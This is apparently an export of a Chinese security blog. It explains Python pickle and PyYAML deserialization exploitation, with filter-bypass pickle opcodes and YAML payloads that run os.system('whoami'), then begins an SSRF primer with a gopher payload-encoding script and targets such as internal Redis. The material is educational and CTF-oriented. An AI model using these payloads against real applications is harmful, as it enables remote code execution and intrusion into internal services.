# S&#x27;key&#x27; = S&#x27;\x6B\x65\x79&#x27;import pickleimport pickletoolsimport secretprint(&quot;变量的值为:&quot; + secret.key)opcode = b&#x27;&#x27;&#x27;c__main__secret(S&#x27;\\x6B\\x65\\x79&#x27;S&#x27;111&#x27;db.&#x27;&#x27;&#x27;if b&#x27;key&#x27; in opcode:    print(&#x27;NoNoNo&#x27;)else:    pickle.loads(opcode)print(&quot;变量的值为:&quot; + str(secret.key))&#x27;&#x27;&#x27;变量的值为:123变量的值为:111&#x27;&#x27;&#x27;

方法二：unicode编码
同样的，V 操作符也可以识别unicode编码
# S&#x27;key&#x27; = V\u006b\u0065\u0079import pickleimport pickletoolsimport secretprint(&quot;变量的值为:&quot; + secret.key)opcode = b&#x27;&#x27;&#x27;c__main__secret(V\u006b\u0065\u0079S&#x27;111111&#x27;db.&#x27;&#x27;&#x27;if b&#x27;key&#x27; in opcode:    print(&#x27;NoNoNo&#x27;)else:    pickle.loads(opcode)print(&quot;变量的值为:&quot; + str(secret.key))&#x27;&#x27;&#x27;变量的值为:123变量的值为:111111&#x27;&#x27;&#x27;


方法三：利用内置函数获取关键字
在python中，当我们导入某个模块后，可以通过dir(sys.modules[&#39;xxx&#39;])来获取其全部属性
例如
import secretimport sysprint(dir(sys.modules[&#x27;secret&#x27;]))&#x27;&#x27;&#x27;[&#x27;__builtins__&#x27;, &#x27;__cached__&#x27;, &#x27;__doc__&#x27;, &#x27;__file__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;key&#x27;]&#x27;&#x27;&#x27;

但是因为pickle不持支列表索引和字典索引，所以需要用reversed()+next()来获取元素
import secretimport sysprint(next(reversed(dir(sys.modules[&#x27;secret&#x27;]))))&#x27;&#x27;&#x27;key&#x27;&#x27;&#x27;

转换成opcode
# 构造出diropcode=b&#x27;&#x27;&#x27;(c__main__secreti__builtin__dir.&#x27;&#x27;&#x27;


# 构造reversedopcode=b&#x27;&#x27;&#x27;((c__main__secreti__builtin__diri__builtin__reversed.&#x27;&#x27;&#x27;


# 构造nextopcode=b&#x27;&#x27;&#x27;(((c__main__secreti__builtin__diri__builtin__reversedi__builtin__next.&#x27;&#x27;&#x27;

# 变量覆盖import pickleimport pickletoolsimport secretprint(&quot;变量的值为:&quot; + secret.key)opcode=b&#x27;&#x27;&#x27;c__main__secret((((c__main__secreti__builtin__diri__builtin__reversedi__builtin__nextS&#x27;111&#x27;db.&#x27;&#x27;&#x27;if b&#x27;key&#x27; in opcode:    print(&#x27;NoNoNo&#x27;)else:    pickle.loads(opcode)print(&quot;变量的值为:&quot; + str(secret.key))&#x27;&#x27;&#x27;变量的值为:123变量的值为:111&#x27;&#x27;&#x27;




绕过builtins对于上文提到的重写find_class()方法来限制调用模块，如果采用的是黑名单的方式，那么就有可能绕过其限制
例如code-breaking 2018 picklecode
import pickleimport ioimport builtinsclass RestrictedUnpickler(pickle.Unpickler):    blacklist = &#123;&#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;execfile&#x27;, &#x27;compile&#x27;, &#x27;open&#x27;, &#x27;input&#x27;, &#x27;__import__&#x27;, &#x27;exit&#x27;&#125;    def find_class(self, module, name):        # Only allow safe classes from builtins.        if module == &quot;builtins&quot; and name not in self.blacklist:            return getattr(builtins, name)        # Forbid everything else.        raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; %                                     (module, name))def restricted_loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()

同样是限制了使用的模块只能为builtins，加上一个黑名单。但是我们可以利用getattr来获取一些黑名单函数，例如builtins.getattr(&#39;builtins&#39;, &#39;eval&#39;)
转换成payload：builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)
然后开始手搓opcode
首先调用builtins.getattr
cbuiltinsgetattr

然后注意不能直接压入builtins，需要构造出一个builtins模块再来传给getattr
例如可以从builtins.globals()中拿到builtins模块，但是因为返回值是&lt;class &#39;dict&#39;&gt;，所以还需要一个builtins.dict中的get函数来取出builtins
变换后的payload：builtins.getattr(builtins.getattr(builtins.dict,&#39;get&#39;)(builtins.globals(),&#39;builtins&#39;),&#39;eval&#39;)(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)
继续编写opcode
#构造出get函数import pickleimport pickletoolsopcode = b&#x27;&#x27;&#x27;cbuiltinsgetattr(cbuiltinsdictS&#x27;get&#x27;tR.&#x27;&#x27;&#x27;pickletools.dis(opcode)print(pickle.loads(opcode))&#x27;&#x27;&#x27;    0: c    GLOBAL     &#x27;builtins getattr&#x27;   18: (    MARK   19: c        GLOBAL     &#x27;builtins dict&#x27;   34: S        STRING     &#x27;get&#x27;   41: t        TUPLE      (MARK at 18)   42: R    REDUCE   43: .    STOPhighest protocol among opcodes = 0&lt;method &#x27;get&#x27; of &#x27;dict&#x27; objects&gt;&#x27;&#x27;&#x27;


# 获取globals()字典import pickleimport pickletoolsopcode = b&#x27;&#x27;&#x27;cbuiltinsglobals)R.&#x27;&#x27;&#x27;pickletools.dis(opcode)print(pickle.loads(opcode))&#x27;&#x27;&#x27;    0: c    GLOBAL     &#x27;builtins globals&#x27;   18: )    EMPTY_TUPLE   19: R    REDUCE   20: .    STOPhighest protocol among opcodes = 1&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x000002490202C9D0&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;C:\\Users\\lewiserii\\Desktop\\test\\2.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;pickle&#x27;: &lt;module &#x27;pickle&#x27; from &#x27;C:\\Python\\Python311\\Lib\\pickle.py&#x27;&gt;, &#x27;pickletools&#x27;: &lt;module &#x27;pickletools&#x27; from &#x27;C:\\Python\\Python311\\Lib\\pickletools.py&#x27;&gt;, &#x27;opcode&#x27;: b&#x27;cbuiltins\nglobals\n)R.\n&#x27;&#125;&#x27;&#x27;&#x27;


# 组合get()和globals()字典，获取builtins模块import pickleimport pickletoolsopcode = b&#x27;&#x27;&#x27;cbuiltinsgetattr(cbuiltinsdictS&#x27;get&#x27;tR(cbuiltinsglobals)RS&#x27;__builtins__&#x27;tR.&#x27;&#x27;&#x27;pickletools.dis(opcode)print(pickle.loads(opcode))&#x27;&#x27;&#x27;    0: c    GLOBAL     &#x27;builtins getattr&#x27;   18: (    MARK   19: c        GLOBAL     &#x27;builtins dict&#x27;   34: S        STRING     &#x27;get&#x27;   41: t        TUPLE      (MARK at 18)   42: R    REDUCE   43: (    MARK   44: c        GLOBAL     &#x27;builtins globals&#x27;   62: )        EMPTY_TUPLE   63: R        REDUCE   64: S        STRING     &#x27;__builtins__&#x27;   80: t        TUPLE      (MARK at 43)   81: R    REDUCE   82: .    STOPhighest protocol among opcodes = 1&lt;module &#x27;builtins&#x27; (built-in)&gt;&#x27;&#x27;&#x27;


# 获取evalimport pickleimport pickletoolsopcode=b&#x27;&#x27;&#x27;cbuiltinsgetattr(cbuiltinsgetattr(cbuiltinsdictS&#x27;get&#x27;tR(cbuiltinsglobals)RS&#x27;__builtins__&#x27;tRS&#x27;eval&#x27;tR.&#x27;&#x27;&#x27;pickletools.dis(opcode)print(pickle.loads(opcode))&#x27;&#x27;&#x27;    0: c    GLOBAL     &#x27;builtins getattr&#x27;   18: (    MARK   19: c        GLOBAL     &#x27;builtins getattr&#x27;   37: (        MARK   38: c            GLOBAL     &#x27;builtins dict&#x27;   53: S            STRING     &#x27;get&#x27;   60: t            TUPLE      (MARK at 37)   61: R        REDUCE   62: (        MARK   63: c            GLOBAL     &#x27;builtins globals&#x27;   81: )            EMPTY_TUPLE   82: R            REDUCE   83: S            STRING     &#x27;__builtins__&#x27;   99: t            TUPLE      (MARK at 62)  100: R        REDUCE  101: S        STRING     &#x27;eval&#x27;  109: t        TUPLE      (MARK at 18)  110: R    REDUCE  111: .    STOPhighest protocol among opcodes = 1&lt;built-in function eval&gt;&#x27;&#x27;&#x27;

# 执行命令import pickleimport pickletoolsopcode=b&#x27;&#x27;&#x27;cbuiltinsgetattr(cbuiltinsgetattr(cbuiltinsdictS&#x27;get&#x27;tR(cbuiltinsglobals)RS&#x27;__builtins__&#x27;tRS&#x27;eval&#x27;tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;tR.&#x27;&#x27;&#x27;pickletools.dis(opcode)print(pickle.loads(opcode))&#x27;&#x27;&#x27;    0: c    GLOBAL     &#x27;builtins getattr&#x27;   18: (    MARK   19: c        GLOBAL     &#x27;builtins getattr&#x27;   37: (        MARK   38: c            GLOBAL     &#x27;builtins dict&#x27;   53: S            STRING     &#x27;get&#x27;   60: t            TUPLE      (MARK at 37)   61: R        REDUCE   62: (        MARK   63: c            GLOBAL     &#x27;builtins globals&#x27;   81: )            EMPTY_TUPLE   82: R            REDUCE   83: S            STRING     &#x27;__builtins__&#x27;   99: t            TUPLE      (MARK at 62)  100: R        REDUCE  101: S        STRING     &#x27;eval&#x27;  109: t        TUPLE      (MARK at 18)  110: R    REDUCE  111: (    MARK  112: S        STRING     &#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;  149: t        TUPLE      (MARK at 111)  150: R    REDUCE  151: .    STOPhighest protocol among opcodes = 1lewiserii\lewiserii0&#x27;&#x27;&#x27;

# 不使用R字节码import pickleimport pickletoolsopcode = b&#x27;\x80\x03(cbuiltins\ngetattr\np0\ncbuiltins\ndict\np1\nX\x03\x00\x00\x00getop2\n0(g2\n(cbuiltins\nglobals\noX\x0C\x00\x00\x00__builtins__op3\n(g0\ng3\nX\x04\x00\x00\x00evalop4\n(g4\nX\x21\x00\x00\x00__import__(&quot;os&quot;).system(&quot;whoami&quot;)o00.&#x27;pickletools.dis(pickletools.optimize(opcode))pickle.loads(opcode)&#x27;&#x27;&#x27;    0: \x80 PROTO      3    2: (    MARK    3: c        GLOBAL     &#x27;builtins getattr&#x27;   21: q        BINPUT     0   23: c        GLOBAL     &#x27;builtins dict&#x27;   38: X        BINUNICODE &#x27;get&#x27;   46: o        OBJ        (MARK at 2)   47: q    BINPUT     1   49: 0    POP   50: (    MARK   51: h        BINGET     1   53: (        MARK   54: c            GLOBAL     &#x27;builtins globals&#x27;   72: o            OBJ        (MARK at 53)   73: X        BINUNICODE &#x27;__builtins__&#x27;   90: o        OBJ        (MARK at 50)   91: q    BINPUT     2   93: (    MARK   94: h        BINGET     0   96: h        BINGET     2   98: X        BINUNICODE &#x27;eval&#x27;  107: o        OBJ        (MARK at 93)  108: q    BINPUT     3  110: (    MARK  111: h        BINGET     3  113: X        BINUNICODE &#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;  151: o        OBJ        (MARK at 110)  152: 0    POP  153: 0    POP  154: .    STOPhighest protocol among opcodes = 2lewiserii\lewiserii&#x27;&#x27;&#x27;


opcode版本有时可以通过改变opcode的版本来绕过一些对字母的过滤

PyYAML 反序列化基础语法规则1：大小写敏感
2：使用空格代替tab键缩进表示层级，对齐即可表示同级
3：和python一样使用’#’注释内容
4：!!表示强制类型转换
5：一个 .yml 文件中可以有多份配置文件，用 — 隔开
更多的语法规则可以看官方手册或菜鸟教程等
类型转换在PyYAML中，可以通过 !! 来进行类型转换

site-packages/yaml/constructor.py中可以看到基础的类型转换过程
例如
# python2# PyYAML4.2b4import yamldata = yaml.load(&#x27;!!str 111&#x27;)print(data)print(type(data))&#x27;&#x27;&#x27;111&lt;type &#x27;str&#x27;&gt;&#x27;&#x27;&#x27;

对应的代码如下，add_constructor定义了一些基础的类型转换
SafeConstructor.add_constructor(        u&#x27;tag:yaml.org,2002:str&#x27;,        SafeConstructor.construct_yaml_str)

def add_constructor(cls, tag, constructor):    if not &#x27;yaml_constructors&#x27; in cls.__dict__:        cls.yaml_constructors = cls.yaml_constructors.copy()    cls.yaml_constructors[tag] = constructoradd_constructor = classmethod(add_constructor)

str对应的函数是 construct_yaml_str，下断点分析
def construct_yaml_str(self, node):    value = self.construct_scalar(node)    try:        return value.encode(&#x27;ascii&#x27;)    except UnicodeEncodeError:        return value

def construct_scalar(self, node):    if isinstance(node, MappingNode):        for key_node, value_node in node.value:            if key_node.tag == u&#x27;tag:yaml.org,2002:value&#x27;:                return self.construct_scalar(value_node)    return BaseConstructor.construct_scalar(self, node)

def construct_scalar(self, node):    if not isinstance(node, ScalarNode):        raise ConstructorError(None, None,                &quot;expected a scalar node, but found %s&quot; % node.id,                node.start_mark)    return node.value

可以看到转换的过程，包括node的值

当然除了add_constructor定义的基础类型外还有add_multi_constructor定义的5个complex python tag
Constructor.add_multi_constructor(    u&#x27;tag:yaml.org,2002:python/name:&#x27;,    Constructor.construct_python_name)Constructor.add_multi_constructor(    u&#x27;tag:yaml.org,2002:python/module:&#x27;,    Constructor.construct_python_module)Constructor.add_multi_constructor(    u&#x27;tag:yaml.org,2002:python/object:&#x27;,    Constructor.construct_python_object)Constructor.add_multi_constructor(    u&#x27;tag:yaml.org,2002:python/object/apply:&#x27;,    Constructor.construct_python_object_apply)Constructor.add_multi_constructor(    u&#x27;tag:yaml.org,2002:python/object/new:&#x27;,    Constructor.construct_python_object_new)

根据图表可以看到这几个都可以引入新的模块，这正是 PyYAML 存在反序列化漏洞的原因
PyYAML &lt; 5.1PyYAML 的利用划分以版本 5.1 为界限，5.1以下利用相对较简单，5.1以上利用相对稍麻烦
&lt;5.1的版本中一共有三个构造器，分别是
BaseConstructor：最最基础的构造器，不支持强制类型转换SafeConstructor：集成 BaseConstructor，强制类型转换和 YAML 规范保持一致，没有魔改Constructor：在 YAML 规范上新增了很多强制类型转换，是默认使用的构造器


python&#x2F;object&#x2F;applyconstruct_python_object_apply
def construct_python_object_apply(self, suffix, node, newobj=False):        # Format:        #   !!python/object/apply       # (or !!python/object/new)        #   args: [ ... arguments ... ]        #   kwds: &#123; ... keywords ... &#125;        #   state: ... state ...        #   listitems: [ ... listitems ... ]        #   dictitems: &#123; ... dictitems ... &#125;        # or short format:        #   !!python/object/apply [ ... arguments ... ]        # The difference between !!python/object/apply and !!python/object/new        # is how an object is created, check make_python_instance for details.        if isinstance(node, SequenceNode):            args = self.construct_sequence(node, deep=True)            kwds = &#123;&#125;            state = &#123;&#125;            listitems = []            dictitems = &#123;&#125;        else:            value = self.construct_mapping(node, deep=True)            args = value.get(&#x27;args&#x27;, [])            kwds = value.get(&#x27;kwds&#x27;, &#123;&#125;)            state = value.get(&#x27;state&#x27;, &#123;&#125;)            listitems = value.get(&#x27;listitems&#x27;, [])            dictitems = value.get(&#x27;dictitems&#x27;, &#123;&#125;)        # 调用 make_python_instance 获取模块中的方法并执行        instance = self.make_python_instance(suffix, node, args, kwds, newobj)        if state:            self.set_python_instance_state(instance, state)        if listitems:            instance.extend(listitems)        if dictitems:            for key in dictitems:                instance[key] = dictitems[key]        return instance

调用 make_python_instance 获取模块中的方法并执行

payload
# short format形式# !!python/object/apply [ ... arguments ... ]yaml.load(&#x27;!!python/object/apply:os.system [&quot;whoami&quot;]&#x27;)yaml.load(&quot;!!python/object/apply:os.system [&#x27;whoami&#x27;]&quot;)yaml.load(&quot;!!python/object/apply:os.system [whoami]&quot;)yaml.load(&quot;!!python/object/apply:subprocess.Popen [&#x27;whoami&#x27;]&quot;)# 其他几种表现形式yaml.load(&quot;exp: !!python/object/apply:os.system [whoami]&quot;)yaml.load(&quot;&quot;&quot;exp: !!python/object/apply:os.system- whoami&quot;&quot;&quot;)yaml.load(&quot;&quot;&quot;exp: !!python/object/apply:os.system  args: [&quot;whoami&quot;]&quot;&quot;&quot;)# command 是 os.system 的参数名(可以通过help(os.system)查看)yaml.load(&quot;&quot;&quot;exp: !!python/object/apply:os.system  kwds: &#123;&quot;command&quot;: &quot;whoami&quot;&#125;&quot;&quot;&quot;)yaml.load(&quot;&quot;&quot;!!python/object/apply:os.system- whoami&quot;&quot;&quot;)

python&#x2F;object&#x2F;new对应的 construct_python_object_new 只有一行代码，调用了construct_python_object_apply
def construct_python_object_new(self, suffix, node):    return self.construct_python_object_apply(suffix, node, newobj=True)

唯一不同的是newobj参数不一样，这个参数影响了 make_python_instance 中的一个判断
if newobj and isinstance(cls, type):    return cls.__new__(cls, *args, **kwds)else:    return cls(*args, **kwds)

基本不影响，所以 python&#x2F;object&#x2F;new 和 python&#x2F;object&#x2F;apply 可以看作是同一个
python&#x2F;objectdef construct_python_object(self, suffix, node):    # Format:    #   !!python/object:module.name &#123; ... state ... &#125;    instance = self.make_python_instance(suffix, node, newobj=True)    yield instance    deep = hasattr(instance, &#x27;__setstate__&#x27;)    state = self.construct_mapping(node, deep=deep)    self.set_python_instance_state(instance, state)

执行 make_python_instance 时并没有传 args 或 kwds 参数，所以只能执行无参函数
例如
import yamlclass User:    def __init__(self):        self.name = &quot;&quot;payload1 = &quot;&quot;&quot;!!python/object:__main__.Username: aaa&quot;&quot;&quot;payload2 = &quot;!!python/object:__main__.User &#123;name: aaa&#125;&quot;data1 = yaml.load(payload1)print(data1.name)data2 = yaml.load(payload2)print(data2.name)&#x27;&#x27;&#x27;aaaaaa&#x27;&#x27;&#x27;


python&#x2F;module代码中只调用了 find_python_module 来导入模块
def construct_python_module(self, suffix, node):    value = self.construct_scalar(node)    if value:        raise ConstructorError(&quot;while constructing a Python module&quot;, node.start_mark,                &quot;expected the empty value, but found %r&quot; % value, node.start_mark)    return self.find_python_module(suffix, node.start_mark)

虽然 construct_python_module 没有调用逻辑，但是与任意文件上传搭配有奇效
比如在upload目录下上传了恶意文件exp.py

就可以用!!python/module:upload.exp来导入
import yamlyaml.load(&#x27;!!python/module:upload.exp&#x27;)&#x27;&#x27;&#x27;root&#x27;&#x27;&#x27;


一个小技巧：当文件名是 __init__.py 时，直接导入目录名即可，可以绕过.的限制
python&#x2F;name代码逻辑与 python&#x2F;module 非常相似，不过module只返回模块，而name返回模块下的属性和方法
def construct_python_name(self, suffix, node):    value = self.construct_scalar(node)    if value:        raise ConstructorError(&quot;while constructing a Python name&quot;, node.start_mark,                &quot;expected the empty value, but found %r&quot; % value, node.start_mark)    return self.find_python_name(suffix, node.start_mark)

这个特性常用在获取未知变量的值上
import yamlkey = &quot;k1y.....&quot;config = &#x27;!!python/name:__main__.key&#x27;print(yaml.load(config))&#x27;&#x27;&#x27;k1y.....&#x27;&#x27;&#x27;


PyYAML &gt;&#x3D; 5.1新增的1：FullConstructor：默认的构造器。2：UnsafeConstructor：支持全部的强制类型转换3：Constructor：等同于 UnsafeConstructor
__all__ = [    &#x27;BaseConstructor&#x27;,    &#x27;SafeConstructor&#x27;,    &#x27;FullConstructor&#x27;,    &#x27;UnsafeConstructor&#x27;,    &#x27;Constructor&#x27;,    &#x27;ConstructorError&#x27;]

如果指定的构造器是 UnsafeConstructor 或者 Constructor ，那么直接用&lt;5.1的方法打就好了
yaml.unsafe_load(exp)yaml.unsafe_load_all(exp)yaml.load(exp, Loader=Loader)yaml.load(exp, Loader=UnsafeLoader)yaml.load_all(exp, Loader=Loader)yaml.load_all(exp, Loader=UnsafeLoader)

默认构造器下的利用方式这里以 PyYAML&#x3D;&#x3D;5.1 为例子
def make_python_instance(self, suffix, node,        args=None, kwds=None, newobj=False, unsafe=False):    if not args:        args = []    if not kwds:        kwds = &#123;&#125;    cls = self.find_python_name(suffix, node.start_mark)    if not (unsafe or isinstance(cls, type)):        raise ConstructorError(&quot;while constructing a Python instance&quot;, node.start_mark,                &quot;expected a class, but found %r&quot; % type(cls),                node.start_mark)    if newobj and isinstance(cls, type):        return cls.__new__(cls, *args, **kwds)    else:        return cls(*args, **kwds)def find_python_name(self, name, mark, unsafe=False):    if not name:        raise ConstructorError(&quot;while constructing a Python object&quot;, mark,                &quot;expected non-empty name appended to the tag&quot;, mark)    if &#x27;.&#x27; in name:        module_name, object_name = name.rsplit(&#x27;.&#x27;, 1)    else:        module_name = &#x27;builtins&#x27;        object_name = name    if unsafe:        try:            __import__(module_name)        except ImportError as exc:            raise ConstructorError(&quot;while constructing a Python object&quot;, mark,                    &quot;cannot find module %r (%s)&quot; % (module_name, exc), mark)    if not module_name in sys.modules:        raise ConstructorError(&quot;while constructing a Python object&quot;, mark,                &quot;module %r is not imported&quot; % module_name, mark)    module = sys.modules[module_name]    if not hasattr(module, object_name):        raise ConstructorError(&quot;while constructing a Python object&quot;, mark,                &quot;cannot find %r in the module %r&quot;                % (object_name, module.__name__), mark)    return getattr(module, object_name)

可以看到引入了 unsafe ，并且有如下的规则
if not (unsafe or isinstance(cls, type))#  module.name 必须是一个类if not module_name in sys.modules# 限制了导入的module必须在 sys.modules 中

方法一：
最简单的方式就是遍历 sys.modules 字典，找一个满足条件的模块中能执行命令的类
比如 subprocess.Popen
yaml.load(&quot;!!python/object/apply:subprocess.Popen [whoami]&quot;)



方法二：
借助 map 来触发函数执行
例如map(eval, [&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;])

需要注意在python2中会直接返回结果，但是在python3中返回的就是一个map对象，需要用一些函数来遍历

# python3list(map(eval, [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]))set(map(eval, [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]))tuple(map(eval, [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]))frozenset(map(eval, [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]))bytes(map(eval, [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]))

转换成yaml格式
import yaml# python2yaml.load(&quot;&quot;&quot;!!python/object/new:map  - !!python/name:eval  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]&quot;&quot;&quot;)# python3yaml.load(&quot;&quot;&quot;!!python/object/new:tuple- !!python/object/new:map  - !!python/name:eval  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]&quot;&quot;&quot;)yaml.load(&quot;&quot;&quot;!!python/object/new:frozenset- !!python/object/new:map  - !!python/name:eval  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]&quot;&quot;&quot;)yaml.full_load(&quot;&quot;&quot;!!python/object/new:bytes- !!python/object/new:map  - !!python/name:eval  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]&quot;&quot;&quot;)

这里存在一个问题，在使用!!python/object/new的情况下只能使用 tuple，bytes 等函数来遍历map对象，用 list 或者 set 都不行（当然在 !!python&#x2F;object&#x2F;apply 下没有问题）
这是因为上文提到的 python&#x2F;object&#x2F;new 与 python&#x2F;object&#x2F;apply 的不同之处导致的
当调用 construct_python_object_apply 时会使 newobj 为 true，那么条件就成立了，就会调用 cls.__new__(cls, *args, **kwds)
if newobj and isinstance(cls, type):    return cls.__new__(cls, *args, **kwds)else:    return cls(*args, **kwds)

因为这几个函数的底层实现并不相同，所以部分函数不能使用 __new__ 来传值

其他方法：
继续看 !!python&#x2F;object&#x2F;new 的代码，可以发现除了调用 make_python_instance 外还有三个判断，这三个判断在之前的payload中并没有使用，因为并没有传对应的值
if state:    self.set_python_instance_state(instance, state)if listitems:    instance.extend(listitems)if dictitems:    for key in dictitems:        instance[key] = dictitems[key]


首先是当 listitems 存在，就会触发 instance 下的 extend 方法。那么我们可以创建一个类，在类中添加一个名为 extend 的方法，然后重写成 eval，就相当于 instance.eval(listitems)
# 利用 type 创建一个新的类a = type(&quot;rce&quot;, (), &#123;&quot;extend&quot;: eval&#125;)a.extend(&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)

转成YAML
yaml.full_load(&quot;&quot;&quot;!!python/object/new:typeargs:  - rce  - !!python/tuple []  - &#123;&quot;extend&quot;: !!python/name:eval &#125;listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;&quot;&quot;&quot;)


state 的利用方式也是同样的，通过修改 __setstate__ 达到执行函数的目的（与pickle中的利用__setstate__执行命令类似）
def set_python_instance_state(self, instance, state):    if hasattr(instance, &#x27;__setstate__&#x27;):        instance.__setstate__(state)    else:        slotstate = &#123;&#125;        if isinstance(state, tuple) and len(state) == 2:            state, slotstate = state        if hasattr(instance, &#x27;__dict__&#x27;):            instance.__dict__.update(state)        elif state:            slotstate.update(state)        for key, value in slotstate.items():            setattr(object, key, value)

a = type(&quot;rce&quot;, (), &#123;&quot;__setstate__&quot;: eval&#125;)a.__setstate__(&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)

转为YAML
yaml.full_load(&quot;&quot;&quot;!!python/object/new:typeargs:  - rce  - !!python/tuple []  - &#123;&quot;__setstate__&quot;: !!python/name:eval &#125;state: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;&quot;&quot;&quot;)


总结：有能调用实例方法的地方，那么就可以构造一个实例，用恶意函数去替换，来执行我们的代码
比如 set_python_instance_state 下的 slotstate.update(state) 也可以rce
yaml.full_load(&quot;&quot;&quot;!!python/object/new:type  args: []  state: !!python/tuple    - &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;    - !!python/object/new:type      args:        - exp        - !!python/tuple []        - &#123;&quot;update&quot;: !!python/name:exec , &quot;items&quot;: !!python/name:list &#125;&quot;&quot;&quot;)# 另一种写法，用 staticmethod 代替 typeyaml.full_load(&quot;&quot;&quot;!!python/object/new:str    args: []    state: !!python/tuple      - &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;      - !!python/object/new:staticmethod        args: []        state:          update: !!python/name:eval          items: !!python/name:list&quot;&quot;&quot;)



参考文章：SecMap - 反序列化（Python）python反序列化详解Python pickle反序列化浅析Pickle反序列化SecMap - 反序列化（PyYAML）
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>python</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>ssrf学习总结</title>
    <url>/posts/76604b1a/</url>
    <content><![CDATA[ssrf服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。
危险函数下面是几个可能会存在SSRF的服务器使用的函数：
file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。readfile()：输出一个文件的内容。fsockopen()：打开一个网络连接或者一个Unix 套接字连接。curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。fopen()：打开一个文件文件或者 URL。

example:
&lt;?php$url=$_POST[&#x27;url&#x27;];$ch=curl_init($url);  //创造一个curl资源curl_setopt($ch, CURLOPT_HEADER, 0); //设置url和相应的选项curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch); // 抓取url并将其传递给浏览器curl_close($ch); //关闭curl资源echo ($result);?&gt;

常用协议httphttp协议用于访问内网资源&#x2F;扫描内网存活主机

dict可以通过dict协议根据响应时间和内容去扫描内网开放端口以及端口上运行的服务信息
example:dict://127.0.0.1:6379 //探测redis是否存活
filefile协议主要用于访问本地计算机的文件，在有回显的情况下，可以用于读取文件进行查看

gopher格式：gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_&lt;TCP数据流&gt;
如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码

通过脚本转换
import urllib.parsepayload =\&quot;&quot;&quot;POST /test.php HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 36test=1&quot;&quot;&quot;#注意后面一定要有回车，回车结尾表示http请求结束tmp = urllib.parse.quote(payload)new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)result = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;_&#x27;+newresult = urllib.parse.quote(result)print(result)       # 这里因为是GET请求所以要进行两次url编码

利用方式攻击内网Redis，FastCGI，MySql等服务
浅析Redis中SSRF的利用
通常会利用Gopherus等工具
MySQL (Port-3306)PostgreSQL(Port-5432)FastCGI (Port-9000)Memcached (Port-11211)    If stored data is getting De-serialized by:        Python        Ruby        PHPRedis (Port-6379)Zabbix (Port-10050)SMTP (Port-25)

